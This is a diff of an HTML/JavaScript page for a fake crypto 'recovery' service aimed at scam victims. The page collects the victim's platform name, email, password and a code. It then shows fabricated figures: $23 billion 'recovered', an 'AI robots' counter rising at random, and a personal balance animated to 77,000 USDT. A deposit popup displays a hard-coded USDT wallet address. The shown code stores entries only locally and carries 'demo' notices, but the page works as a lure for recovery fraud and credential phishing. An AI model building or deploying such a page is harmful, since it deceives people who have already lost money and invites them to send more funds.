@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Coinstats Ai recovery organisation</title>
+  <title>Crypto Recovery Platform</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
   <style>
     :root {
@@ -24,67 +24,893 @@
       --glass: rgba(19,31,54,0.84);
       --border: #334155;
     }
-    body, html {
+
+    html, body {
       min-height: 100vh;
       margin: 0;
       font-family: 'Inter', Arial, sans-serif;
       color: var(--text-main);
       position: relative;
-      background: var(--bg);
+      background: none;
     }
-    /* Modern shared image background */
-    .main-bg-img {
+
+    .full-bg-img {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
       z-index: 0;
-      width: 100vw;
-      height: 100vh;
+      width: 100vw; height: 100vh;
       object-fit: cover;
       object-position: center;
-      opacity: 0.88;
-      filter: blur(1px) brightness(0.92) saturate(1.15);
+      filter: brightness(0.9) blur(0px) contrast(1.05) saturate(1.11);
+      transition: filter 0.22s;
       pointer-events: none;
-      /* User cannot drag or select */
-      user-select: none;
-      -webkit-user-drag: none;
-      transition: opacity 0.5s;
     }
+
     body::before {
       content: "";
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
       background: var(--overlay);
-      z-index: 0;
+      z-index: 1;
       pointer-events: none;
     }
 
-    .center-container, .dashboard-container {
+    .center-container,
+    .dashboard-container {
       position: relative;
-      z-index: 1;
+      z-index: 2;
     }
 
-    /* ... Existing styles unchanged ... */
+    /* ===== COMMON & ONBOARDING STYLES ===== */
+    .center-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
 
-    /* Modal styles for deposit popup */
-    .modal {
+    .card {
+      background: var(--card-bg);
+      border-radius: 1.5rem;
+      box-shadow: var(--shadow);
+      padding: 3rem 2.5rem 2.5rem 2.5rem;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      backdrop-filter: blur(6px);
+    }
+
+    .card h1 {
+      font-size: 2.2rem;
+      font-weight: 800;
+      color: var(--primary);
+      margin-bottom: 1rem;
+      letter-spacing: -1px;
+    }
+
+    .card p {
+      font-size: 1.1rem;
+      color: var(--text-subtle);
+      margin-bottom: 2.2rem;
+      font-weight: 400;
+    }
+
+    .cta-btn, .verify-btn, .login-btn, .code-btn {
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      color: #fff;
+      border: none;
+      border-radius: 999px;
+      padding: 0.95rem 2.4rem;
+      font-size: 1.15rem;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 2px 16px 0 rgba(46,91,255,0.11);
+      transition: transform 0.18s cubic-bezier(.42,.24,.44,1.09), box-shadow 0.18s;
+      margin-top: 1.2rem;
+    }
+
+    .cta-btn:hover, .cta-btn:focus,
+    .verify-btn:hover, .verify-btn:focus,
+    .login-btn:hover, .login-btn:focus,
+    .code-btn:hover, .code-btn:focus {
+      transform: scale(1.06);
+      box-shadow: 0 6px 32px 0 rgba(46,91,255,0.25);
+      outline: none;
+    }
+
+    .hidden {
       display: none;
-      position: fixed;
-      z-index: 999;
-      left: 0; top: 0;
-      width: 100vw; height: 100vh;
-      background: rgba(0,0,0,0.45);
+    }
+
+    .input-group {
+      margin-bottom: 1.5rem;
+      text-align: left;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 0.4rem;
+      font-weight: 600;
+      color: var(--primary);
+      font-size: 1rem;
+    }
+
+    .input-group input {
+      width: 100%;
+      border-radius: 0.7rem;
+      border: 1px solid #d1d5db;
+      padding: 0.8rem 1rem;
+      font-size: 1rem;
+      margin-bottom: 0.3rem;
+      box-sizing: border-box;
+      outline: none;
+      font-family: inherit;
+      background: #fff;
+      color: var(--text-main);
+      transition: border 0.15s;
+    }
+
+    .input-group input:focus {
+      border: 1.8px solid var(--primary);
+    }
+
+    .error-message {
+      color: #e53e3e;
+      font-size: 0.95rem;
+      margin-bottom: 0.8rem;
+      margin-top: -0.5rem;
+      text-align: left;
+    }
+
+    /* ===== DASHBOARD STYLES ===== */
+    .dashboard-container {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 0 3rem 0;
+      background: linear-gradient(120deg, #0e7ee477 0%, #2dd4bf33 100%);
+    }
+    .dashboard-header {
+      margin-top: 2.7rem;
+      text-align: center;
+    }
+    .dashboard-header h1 {
+      font-size: 2.5rem;
+      font-weight: 800;
+      color: var(--primary);
+      margin: 0 0 0.5rem 0;
+      letter-spacing: -1.5px;
+    }
+    .dashboard-header .hello-user {
+      font-size: 1.2rem;
+      color: var(--secondary);
+      margin-bottom: 0.8rem;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+    }
+    .dashboard-header .recovered-amount {
+      font-size: 2.2rem;
+      font-weight: 800;
+      color: var(--success);
+      margin-top: 0.5rem;
+      margin-bottom: 0.7rem;
+      letter-spacing: -1px;
+      text-shadow: 0 4px 24px #22c55e33;
+      display: flex;
       align-items: center;
       justify-content: center;
-      animation: modalShow 0.22s;
+      gap: 0.7rem;
     }
-    .modal.active {
+    .dashboard-header .recovered-label {
+      color: var(--text-subtle);
+      font-size: 1.15rem;
+      font-weight: 500;
+      letter-spacing: 0.1em;
+    }
+
+    /* Personal Recovery Dashboard */
+    .personal-recovery-section {
+      width: 97%;
+      max-width: 420px;
+      margin: 2.2rem auto 0 auto;
+      background: var(--surface);
+      border-radius: 1.2rem;
+      box-shadow: 0 2px 18px 0 #1e293b22;
+      padding: 2rem 1.4rem 2.2rem 1.4rem;
       display: flex;
+      flex-direction: column;
+      align-items: center;
+      border: 1.2px solid var(--border);
+      position: relative;
     }
-    @keyframes modalShow {
-      from { opacity: 0; }
-      to { opacity: 1; }
+    .personal-title {
+      color: var(--accent);
+      font-size: 1.16rem;
+      font-weight: 700;
+      letter-spacing: 0.09em;
+      margin-bottom: 0.5rem;
     }
-    .modal-content {
+    .personal-balance-label {
+      color: var(--primary);
+      font-size: 1.04rem;
+      font-weight: 600;
+      margin-bottom: 0.3rem;
+      letter-spacing: 0.05em;
+    }
+    .personal-balance-amount {
+      font-size: 2.1rem;
+      font-weight: 800;
+      color: var(--secondary);
+      margin-bottom: 1.2rem;
+      text-shadow: 0 3px 20px #2dd4bf66;
+      letter-spacing: 1px;
+      min-height: 2.2rem;
+    }
+    .personal-request-btn {
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      color: #fff;
+      border: none;
+      border-radius: 999px;
+      padding: 0.85rem 2.2rem;
+      font-size: 1.13rem;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 0.7rem;
+      margin-bottom: 0.8rem;
+      box-shadow: 0 2px 16px 0 rgba(46,91,255,0.10);
+      transition: transform 0.14s, box-shadow 0.14s;
+      letter-spacing: 1px;
+    }
+    .personal-request-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .personal-request-btn:hover:enabled {
+      transform: scale(1.06);
+      box-shadow: 0 6px 32px 0 rgba(46,91,255,0.18);
+    }
+    .personal-processing {
+      color: var(--accent);
+      font-size: 1.07rem;
+      margin-top: 0.3rem;
+      margin-bottom: 0.3rem;
+      font-weight: 500;
+      letter-spacing: 0.03em;
+      min-height: 1.6rem;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+    }
+    .spinner {
+      width: 22px; height: 22px;
+      border: 3px solid var(--primary);
+      border-top: 3px solid var(--secondary);
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      display: inline-block;
+      vertical-align: middle;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+
+    .token-balance-section {
+      width: 97%;
+      margin: 0 auto;
+      margin-bottom: 2.2rem;
+      background: var(--surface);
+      border-radius: 1.2rem;
+      box-shadow: 0 2px 18px 0 #1e293b22;
+      padding: 1.5rem 1.6rem 2.1rem 1.6rem;
+      max-width: 660px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      border: 1.2px solid var(--border);
+    }
+    .balance-label {
+      color: var(--text-subtle);
+      font-size: 1.09rem;
+      font-weight: 500;
+      letter-spacing: 0.05em;
+      margin-bottom: 0.5rem;
+    }
+    .balance-amount {
+      font-size: 2.1rem;
+      font-weight: 800;
+      color: var(--primary);
+      margin-bottom: 1.6rem;
+      text-shadow: 0 3px 20px #0e7ee488;
+      min-height: 2.2rem;
+    }
+    .token-actions-row {
+      display: flex;
+      gap: 1.5rem;
+      justify-content: center;
+      margin-bottom: 1.6rem;
+      flex-wrap: wrap;
+    }
+    .token-btn {
+      background: linear-gradient(90deg, var(--secondary), var(--primary));
+      color: #fff;
+      border: none;
+      border-radius: 999px;
+      padding: 0.75rem 2.1rem;
+      font-size: 1.09rem;
+      font-weight: 600;
+      cursor: pointer;
+      margin: 0.2rem 0;
+      box-shadow: 0 2px 10px 0 rgba(46,91,255,0.08);
+      transition: transform 0.14s, box-shadow 0.14s;
+    }
+    .token-btn:hover {
+      transform: scale(1.04);
+      box-shadow: 0 4px 20px 0 rgba(46,91,255,0.18);
+    }
+    .withdraw-form {
+      width: 100%;
+      margin-top: 1.1rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.8rem;
+      max-width: 410px;
+    }
+    .withdraw-form input {
+      width: 100%;
+      padding: 0.65rem 1rem;
+      border-radius: 0.7rem;
+      border: 1.2px solid var(--border);
+      font-size: 1rem;
+      background: #1e293b;
+      color: var(--text-main);
+      outline: none;
+      margin-bottom: 0.2rem;
+      transition: border 0.15s;
+    }
+    .withdraw-form input:focus {
+      border: 1.7px solid var(--primary);
+    }
+
+    .token-list-section {
+      margin: 2.5rem auto 1.7rem auto;
+      width: 95%;
+      max-width: 500px;
+      background: var(--dashboard-card-bg);
+      border-radius: 1rem;
+      box-shadow: 0 2px 14px 0 #1e293b11;
+      padding: 1.2rem 1.5rem 1.1rem 1.5rem;
+      border: 1.2px solid var(--border);
+    }
+    .token-list-title {
+      color: var(--primary);
+      font-weight: 700;
+      margin-bottom: 0.7rem;
+      font-size: 1.13rem;
+      letter-spacing: 0.09em;
+    }
+    .token-list {
+      display: flex;
+      flex-direction: row;
+      justify-content: space-between;
+      align-items: center;
+      gap: 1.1rem;
+      flex-wrap: wrap;
+      width: 100%;
+    }
+    .token-item {
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      gap: 0.7rem;
+      background: #24304b;
+      border-radius: 0.7rem;
+      padding: 0.5rem 1.1rem;
+      margin-bottom: 0.4rem;
+      font-weight: 600;
+      font-size: 1.09rem;
+      color: var(--text-main);
+      min-width: 90px;
+      box-shadow: 0 1px 4px 0 #1e293b10;
+    }
+    .token-icon {
+      width: 1.55rem;
+      height: 1.55rem;
+      background: #fff2;
+      border-radius: 50%;
+      margin-right: 0.3rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.14rem;
+    }
+
+    .ai-robot-section {
+      margin: 2.2rem auto 0 auto;
+      width: 97%;
+      max-width: 540px;
+      background: var(--surface);
+      border-radius: 1rem;
+      box-shadow: 0 2px 14px 0 #1e293b10;
+      padding: 1.6rem 1.7rem 2.2rem 1.7rem;
+      text-align: center;
+      border: 1.2px solid var(--border);
+      position: relative;
+      min-height: 220px;
+      overflow: hidden;
+    }
+    .ai-title {
+      color: var(--secondary);
+      font-weight: 800;
+      font-size: 1.18rem;
+      margin-bottom: 0.5rem;
+      letter-spacing: 0.08em;
+    }
+    .ai-sub {
+      color: var(--text-subtle);
+      font-size: 1.06rem;
+      margin-bottom: 1.1rem;
+    }
+    .ai-amount-today {
+      font-size: 2.1rem;
+      font-weight: 800;
+      color: var(--success);
+      margin-bottom: 1.2rem;
+      letter-spacing: -1px;
+      text-shadow: 0 3px 20px #22c55e33;
+    }
+    .spinning-wheel {
+      margin: 0.6rem auto 0 auto;
+      width: 74px;
+      height: 74px;
+      border-radius: 50%;
+      border: 6px solid var(--primary);
+      border-top: 6px solid var(--secondary);
+      border-bottom: 6px solid #1e293b;
+      border-left: 6px solid var(--accent);
+      animation: spin 1.5s linear infinite;
+      box-shadow: 0 0 24px 0 #0e7ee488;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      margin-bottom: 1.1rem;
+    }
+    .ai-robot-face {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -60%);
+      width: 26px; height: 26px;
+      background: #fff;
+      border-radius: 50%;
+      border: 2px solid var(--primary);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    @media (max-width: 600px) {
+      .card {
+        padding: 2rem 1.1rem 1.4rem 1.1rem;
+        max-width: 95vw;
+      }
+      .card h1 {
+        font-size: 1.4rem;
+      }
+      .cta-btn, .verify-btn, .login-btn, .code-btn {
+        font-size: 1rem;
+        padding: 0.7rem 1.5rem;
+      }
+    }
+    @media (max-width: 700px) {
+      .dashboard-header h1 { font-size: 1.5rem; }
+      .dashboard-header .recovered-amount { font-size: 1.3rem;}
+      .token-actions-row { flex-direction: column; gap: 1.1rem;}
+      .token-balance-section { max-width: 98vw; }
+      .token-list-section { max-width: 98vw; }
+      .ai-robot-section { max-width: 99vw; }
+      .personal-recovery-section { max-width: 99vw; }
+    }
+
+    /* Modal styles for deposit address */
+    .modal-bg {
+      position: fixed;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      background: rgba(20, 24, 36, 0.58);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      transition: opacity 0.2s;
+    }
+    .modal-bg.hidden { display: none; }
+    .modal {
       background: var(--card-bg);
-      border-radius: 1.3rem;
-     
+      border-radius: 1.2rem;
+      box-shadow: 0 6px 32px 0 rgba(30,41,59,0.21);
+      padding: 2.2rem 1.5rem 1.7rem 1.5rem;
+      max-width: 370px;
+      width: 100%;
+      position: relative;
+      text-align: center;
+      animation: modalIn 0.16s cubic-bezier(.55,.16,.63,1.35);
+    }
+    @keyframes modalIn {
+      from { transform: translateY(30px) scale(0.98); opacity: 0.7; }
+      to { transform: none; opacity: 1; }
+    }
+    .modal h2 {
+      color: var(--primary);
+      font-weight: 800;
+      margin-bottom: 1.1rem;
+      font-size: 1.36rem;
+      letter-spacing: -0.5px;
+    }
+    .deposit-address-box {
+      background: #f4f7fb;
+      border: 1.2px solid var(--primary);
+      border-radius: 0.6rem;
+      padding: 0.85rem 1rem;
+      font-size: 1.1rem;
+      word-break: break-all;
+      font-family: 'Inter', monospace;
+      color: var(--primary);
+      margin-bottom: 1.1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .copy-btn {
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      border-radius: 0.7rem;
+      padding: 0.45rem 1.05rem;
+      font-size: 1rem;
+      font-weight: 600;
+      margin-left: 0.7rem;
+      cursor: pointer;
+      transition: background 0.12s;
+    }
+    .copy-btn:hover { background: var(--secondary);}
+    .qr-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 1.3rem;
+    }
+    .close-modal-btn {
+      position: absolute;
+      top: 0.95rem; right: 1.1rem;
+      background: none;
+      border: none;
+      color: var(--danger);
+      font-size: 1.7rem;
+      font-weight: 800;
+      cursor: pointer;
+      line-height: 1;
+      z-index: 2;
+      transition: color 0.1s;
+    }
+    .close-modal-btn:hover { color: var(--primary);}
+    .modal-note {
+      margin-bottom: 0.8rem;
+      color: var(--text-subtle);
+      font-size: 1.01rem;
+      line-height: 1.35;
+    }
+  </style>
+</head>
+<body>
+  <!-- Full background image for both login & dashboard -->
+  <img class="full-bg-img" src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1500&q=80" alt="Crypto Recovery Background" />
+
+  <!-- ===== Onboarding Flow ===== -->
+  <div class="center-container" id="onboarding-container">
+    <!-- Initial Welcome Card -->
+    <div class="card" id="welcome-card">
+      <h1>COIN-STATS Recovery.io</h1>
+      <p>
+        Securely recover lost cryptocurrencies and assets with our trusted, transparent, and modern recovery solutions.
+      </p>
+      <button class="cta-btn" id="start-btn">Start Recovery</button>
+    </div>
+    <!-- Step 1: Platform Name Input -->
+    <div class="card hidden" id="platform-card">
+      <h1>Recovery Login</h1>
+      <form id="platform-form">
+        <div class="input-group">
+          <label for="platform-input">Name of Investment Platform (you got scammed)</label>
+          <input id="platform-input" name="platform" type="text" placeholder="e.g. Binance, Coinbase, etc." required />
+        </div>
+        <button type="submit" class="verify-btn">Verify</button>
+      </form>
+    </div>
+    <!-- Step 2: Email and Password Input -->
+    <div class="card hidden" id="login-card">
+      <h1>Enter Credentials</h1>
+      <form id="login-form">
+        <div class="input-group">
+          <label for="email-input">Email Address</label>
+          <input id="email-input" name="email" type="email" placeholder="you@email.com" autocomplete="email" required />
+        </div>
+        <div class="input-group">
+          <label for="password-input">Password</label>
+          <input id="password-input" name="password" type="password" placeholder="Enter password" autocomplete="current-password" required />
+        </div>
+        <button type="submit" class="login-btn">Continue</button>
+      </form>
+    </div>
+    <!-- Step 3: Enter Verification Code -->
+    <div class="card hidden" id="code-card">
+      <h1>Verification Code</h1>
+      <form id="code-form">
+        <div class="input-group">
+          <label for="code-input">Enter the 6-digit code</label>
+          <input id="code-input" name="code" type="text" placeholder="Enter code" required maxlength="6" minlength="6" />
+        </div>
+        <button type="submit" class="code-btn">Access Dashboard</button>
+      </form>
+      <div id="code-hint" style="margin-top:1rem;color:var(--secondary);font-weight:600;"></div>
+    </div>
+  </div>
+
+  <!-- ===== Dashboard Section (Hidden initially) ===== -->
+  <div class="dashboard-container hidden" id="dashboard-container">
+    <div class="dashboard-header">
+      <h1>Crypto Recovery Dashboard</h1>
+      <div class="hello-user" id="hello-user"></div>
+      <div class="recovered-amount">
+        $23,000,000,000
+      </div>
+      <div class="recovered-label">TOTAL AMOUNT RECOVERED</div>
+    </div>
+    <!-- Personal Recovery Dashboard -->
+    <div class="personal-recovery-section" id="personal-recovery-section">
+      <div class="personal-title">MY PERSONAL RECOVERY</div>
+      <div class="personal-balance-label">Recovered Balance</div>
+      <div class="personal-balance-amount" id="personal-balance-amount">0.00 USDT</div>
+      <button class="personal-request-btn" id="personal-request-btn">Request My Recovery</button>
+      <div class="personal-processing" id="personal-processing"></div>
+    </div>
+    <div class="token-balance-section" id="token-balance-section">
+      <div class="balance-label">Current Holding</div>
+      <div class="balance-amount" id="current-balance">0.00 USDT</div>
+      <div class="token-actions-row">
+        <button class="token-btn" id="deposit-btn">Deposit</button>
+        <button class="token-btn" id="withdraw-btn">Withdraw</button>
+      </div>
+      <form class="withdraw-form" id="withdraw-form" style="display:none;">
+        <input type="number" id="withdraw-amount" placeholder="Amount to withdraw (USDT)" min="1" step="any" required />
+        <input type="text" id="withdraw-address" placeholder="Destination Wallet Address" required />
+        <button type="submit" class="token-btn" style="width:100%;">Confirm Withdraw</button>
+      </form>
+    </div>
+    <div class="token-list-section">
+      <div class="token-list-title">Trending Tokens</div>
+      <div class="token-list">
+        <div class="token-item"><span class="token-icon">₿</span>BTC</div>
+        <div class="token-item"><span class="token-icon">Ξ</span>ETH</div>
+        <div class="token-item"><span class="token-icon"><img src="https://cryptologos.cc/logos/solana-sol-logo.png?v=024" alt="Solana" style="width:1.13rem;height:1.13rem;vertical-align:-2px;"/></span>SOLANA</div>
+        <div class="token-item"><span class="token-icon"><img src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=024" alt="USDT" style="width:1.13rem;height:1.13rem;vertical-align:-2px;"/></span>USDT</div>
+        <div class="token-item"><span class="token-icon"><img src="https://cryptologos.cc/logos/bnb-bnb-logo.png?v=024" alt="BNB" style="width:1.13rem;height:1.13rem;vertical-align:-2px;"/></span>BNB</div>
+      </div>
+    </div>
+    <div class="ai-robot-section">
+      <div class="ai-title">AI ROBOTS WORKING ON RECOVERY</div>
+      <div class="ai-sub">Today's Recovered Amount</div>
+      <div class="ai-amount-today" id="ai-amount-today">$1,000,000</div>
+      <div class="spinning-wheel">
+        <div class="ai-robot-face">
+          <svg width="20" height="20" style="position:absolute;top:5px;left:2px;" viewBox="0 0 20 20" fill="none">
+            <ellipse cx="6" cy="10" rx="2" ry="2" fill="#333"/>
+            <ellipse cx="14" cy="10" rx="2" ry="2" fill="#333"/>
+          </svg>
+        </div>
+      </div>
+      <div style="margin-top:1.5rem;color:var(--text-subtle);font-size:1.02rem;">
+        AI-powered bots are actively recovering your digital assets.
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Deposit Modal Popup ===== -->
+  <div id="deposit-modal-bg" class="modal-bg hidden">
+    <div class="modal" id="deposit-modal">
+      <button class="close-modal-btn" id="close-deposit-modal" title="Close">&times;</button>
+      <h2>Deposit USDT</h2>
+      <div class="qr-section" style="align-items:center;">
+        <!-- QR code img element, wallet-like size -->
+        <img id="deposit-qr-img" src="" alt="Deposit QR Code" style="width:92px;height:92px;display:block;margin:0 auto 0.6rem auto;background:#fff;border-radius:0.3rem;border:1px solid #e2e8f0;" />
+        <div class="modal-note" style="margin-bottom:0.7rem;">Scan QR code to get the address in your wallet app.</div>
+      </div>
+      <div class="deposit-address-box">
+        <span id="deposit-address-text"></span>
+        <button class="copy-btn" id="copy-address-btn">Copy</button>
+      </div>
+      <div class="modal-note">
+        Send only <b>USDT (TRC20/BEP20/ERC20)</b> to this address. Your deposit will appear instantly in your dashboard.<br>
+        (Demo only: No actual funds received.)
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ============ ONBOARDING LOGIC ================
+    const LS_KEY = "crp_user_data_v1";
+
+    function getUserData(email) {
+      try {
+        const all = JSON.parse(localStorage.getItem(LS_KEY) || "{}");
+        return all[email] || { recoveryRequested: false, personalBalance: 0, holding: 0 };
+      } catch (e) { return { recoveryRequested: false, personalBalance: 0, holding: 0 }; }
+    }
+    function setUserData(email, data) {
+      let all = {};
+      try { all = JSON.parse(localStorage.getItem(LS_KEY) || "{}"); } catch {}
+      all[email] = data;
+      localStorage.setItem(LS_KEY, JSON.stringify(all));
+    }
+
+    let userEmail = "";
+    let generatedCode = "";
+    let userData = {};
+
+    function showCard(cardId) {
+      for (const id of ['welcome-card', 'platform-card', 'login-card', 'code-card']) {
+        document.getElementById(id).classList.add('hidden');
+      }
+      document.getElementById(cardId).classList.remove('hidden');
+    }
+
+    document.getElementById('start-btn').onclick = function() {
+      showCard('platform-card');
+    };
+    document.getElementById('platform-form').onsubmit = function(e) {
+      e.preventDefault();
+      showCard('login-card');
+    };
+    document.getElementById('login-form').onsubmit = function(e) {
+      e.preventDefault();
+      userEmail = document.getElementById('email-input').value.trim().toLowerCase();
+      generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+      showCard('code-card');
+      document.getElementById('code-hint').textContent = "Your verification code: " + generatedCode;
+    };
+    document.getElementById('code-form').onsubmit = function(e) {
+      e.preventDefault();
+      const inputCode = document.getElementById('code-input').value;
+      if (inputCode === generatedCode) {
+        userData = getUserData(userEmail);
+        openDashboard();
+      } else {
+        alert("Incorrect code. Please try again.");
+      }
+    };
+
+    // ============ DASHBOARD LOGIC ================
+    function openDashboard() {
+      document.getElementById('onboarding-container').classList.add('hidden');
+      document.getElementById('dashboard-container').classList.remove('hidden');
+      document.getElementById('hello-user').textContent = "Hello, " + userEmail;
+      updateDashboardBalances();
+      setupDashboardHandlers();
+    }
+
+    function updateDashboardBalances() {
+      userData = getUserData(userEmail);
+      document.getElementById('personal-balance-amount').textContent =
+        Number(userData.personalBalance || 0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}) + " USDT";
+      document.getElementById('current-balance').textContent =
+        Number(userData.holding || 0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}) + " USDT";
+      document.getElementById('personal-request-btn').disabled = !!userData.recoveryRequested;
+      document.getElementById('personal-processing').innerHTML = userData.recoveryRequested
+        ? `<span style="color:var(--success);font-weight:700;">Success!</span> Your recovery is complete.`
+        : '';
+    }
+
+    function setupDashboardHandlers() {
+      const withdrawBtn = document.getElementById('withdraw-btn');
+      const depositBtn = document.getElementById('deposit-btn');
+      const withdrawForm = document.getElementById('withdraw-form');
+
+      // ===== Deposit Modal Logic =====
+      const depositModalBg = document.getElementById('deposit-modal-bg');
+      const depositModal = document.getElementById('deposit-modal');
+      const depositQrImg = document.getElementById('deposit-qr-img');
+      const depositAddressText = document.getElementById('deposit-address-text');
+      const copyAddressBtn = document.getElementById('copy-address-btn');
+      const closeDepositModal = document.getElementById('close-deposit-modal');
+
+      // Demo: static address (replace with unique if needed)
+      const depositAddress = "TQ4uJZg2hV2nRZ3nJf8Zg3sY8nXzA5ENkH"; // Example USDT TRC20 address
+
+      depositBtn.onclick = function() {
+        // Google Charts QR Code for wallet-like appearance (92x92)
+        depositQrImg.src = "https://chart.googleapis.com/chart?cht=qr&chs=92x92&chl=" + encodeURIComponent(depositAddress);
+        depositAddressText.textContent = depositAddress;
+        depositModalBg.classList.remove('hidden');
+      };
+      closeDepositModal.onclick = function() {
+        depositModalBg.classList.add('hidden');
+      };
+      depositModalBg.onclick = function(e) {
+        if (e.target === depositModalBg) depositModalBg.classList.add('hidden');
+      };
+      copyAddressBtn.onclick = function() {
+        navigator.clipboard.writeText(depositAddress).then(function() {
+          copyAddressBtn.textContent = "Copied!";
+          setTimeout(()=>{copyAddressBtn.textContent = "Copy";}, 1400);
+        });
+      };
+
+      withdrawBtn.onclick = () => {
+        withdrawForm.style.display = withdrawForm.style.display === 'none' ? 'flex' : 'none';
+      };
+
+      withdrawForm.onsubmit = function(e) {
+        e.preventDefault();
+        const amount = parseFloat(document.getElementById('withdraw-amount').value);
+        const address = document.getElementById('withdraw-address').value;
+        let currentBalance = Number(userData.holding || 0);
+        if(amount > currentBalance) {
+          alert("Insufficient balance!");
+          return;
+        }
+        currentBalance -= amount;
+        userData.holding = currentBalance;
+        setUserData(userEmail, userData);
+        updateDashboardBalances();
+        alert("Withdrawal request submitted to:\n" + address + "\nAmount: " + amount + " USDT\n\n(For demo only)");
+        withdrawForm.style.display = 'none';
+        document.getElementById('withdraw-amount').value = '';
+        document.getElementById('withdraw-address').value = '';
+      };
+
+      // Personal Recovery Dashboard Logic
+      const personalBtn = document.getElementById('personal-request-btn');
+      const personalBalance = document.getElementById('personal-balance-amount');
+      const personalProcessing = document.getElementById('personal-processing');
+      personalBtn.onclick = function() {
+        if(userData.recoveryRequested) return;
+        userData.recoveryRequested = true;
+        personalBtn.disabled = true;
+        personalProcessing.innerHTML = `<span class="spinner"></span> Hold on while we process your request...`;
+
+        // Animate from 0 to 77,000 over ~3 seconds
+        let target = 77000, duration = 3000, frame = 30, steps = duration / frame, current = 0, stepAmount = target/steps;
+        let step = 0;
+        const interval = setInterval(()=>{
+          step++;
+          current += stepAmount;
+          if(current > target) current = target;
+          personalBalance.textContent = current.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}) + " USDT";
+          document.getElementById('current-balance').textContent = personalBalance.textContent;
+          if(step >= steps) {
+            clearInterval(interval);
+            personalBalance.textContent = target.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}) + " USDT";
+            document.getElementById('current-balance').textContent = personalBalance.textContent;
+            personalProcessing.innerHTML = `<span style="color:var(--success);font-weight:700;">Success!</span> Your recovery is complete.`;
+            userData.personalBalance = target;
+            userData.holding = target;
+            setUserData(userEmail, userData);
+            updateDashboardBalances();
+          }
+        }, frame);
+        setUserData(userEmail, userData);
+      };
+    }
+
+    // AI Recovery Amount - increments up
+    const aiAmountEl = document.getElementById('ai-amount-today');
+    let aiAmount = 1000000;
+    setInterval(()=>{
+      const increment = Math.random() * 190 + 10; // $10 - $200
+      aiAmount += increment;
+      aiAmountEl.textContent = "$" + aiAmount.toLocaleString(undefined, {maximumFractionDigits:0});
+    }, 1600);
+  </script>
+</body>
+</html>
